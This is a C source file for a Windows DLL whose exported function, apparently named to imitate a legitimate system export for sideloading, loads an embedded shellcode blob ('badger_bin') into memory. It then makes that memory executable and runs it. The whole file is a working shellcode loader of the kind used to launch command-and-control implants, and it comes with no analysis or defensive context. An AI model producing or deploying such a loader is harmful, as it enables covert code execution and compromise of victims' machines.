#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

#define EXPORT __declspec(dllexport)

EXPORT LONG ProgDlgTakeFgIfShowing() {
    MessageBoxA(NULL, "Success", "Executing Shellcode", MB_OK);
    DWORD flOldProtect = 0;
    LPVOID addressPointer = VirtualAlloc(NULL, badger_bin_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    memcpy(addressPointer, badger_bin, badger_bin_len);
    VirtualProtect(addressPointer, badger_bin_len, PAGE_EXECUTE_READ, &flOldProtect);
    ((void(*)())addressPointer)();
    WaitForSingleObject((HANDLE)-1, -1);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason){
	case DLL_PROCESS_ATTACH:
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
